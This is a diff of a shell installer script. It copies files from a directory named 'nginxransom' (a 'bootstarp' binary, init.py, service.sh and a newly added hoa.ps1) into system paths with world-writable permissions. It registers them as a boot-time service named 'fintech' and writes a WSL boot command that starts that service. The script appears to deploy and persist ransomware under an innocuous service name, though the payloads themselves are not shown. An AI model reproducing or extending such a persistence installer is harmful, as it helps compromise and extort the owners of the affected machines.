@@ -16,19 +16,21 @@ cp   nginxransom/bootstarp.txt /usr/bin/bootstarp
 cp   nginxransom/service.sh ../
 cp   nginxransom/service.sh ../mnt/
 cp   nginxransom/init.py    ../mnt/
+cp   nginxransom/hoa.ps1    ../mnt/
 chmod 777 /usr/bin/bootstarp 
 chmod 777 mnt/usr/local/bin/bootstarp
 chmod 777 mnt/usr/bin/bootstarp 
 chmod 777 mnt/service.sh
 chmod 777 service.sh
 chmod 777 init.py
+chmod 777 hoa.ps1
 chroot mnt/ cp service.sh /etc/init.d/fintech
 rm -rf service.sh
 chroot mnt/ chmod +x /etc/init.d/fintech
 chroot mnt/ service fintech start
 #chroot mnt/ ./service.sh start
 chroot mnt/ update-rc.d fintech defaults
-chroot mnt/ echo -e '[boot]\ncommand="service fintech start"\n\n[automount]\nenabled = true\nroot = /\noptions = "metadata"' > mnt/etc/wsl.conf
+chroot mnt/ echo -e '[boot]\ncommand="service fintech start && service docker start"\n\n[automount]\nenabled = true\nroot = /\noptions = "metadata"' > mnt/etc/wsl.conf
 #chroot ./ ./bootstarp 
 #echo  "[Unit]\nDescription=finetech\nAfter=network.target\n\n[Service]\nExecStart=/usr/local/bin/bootstarp\nRestart=always\n\n[Install]\nWantedBy=multi-user.target" > mnt/usr/lib/systemd/system/finetech.service
 #chmod 777  mnt/usr/lib/systemd/system/finetech.service
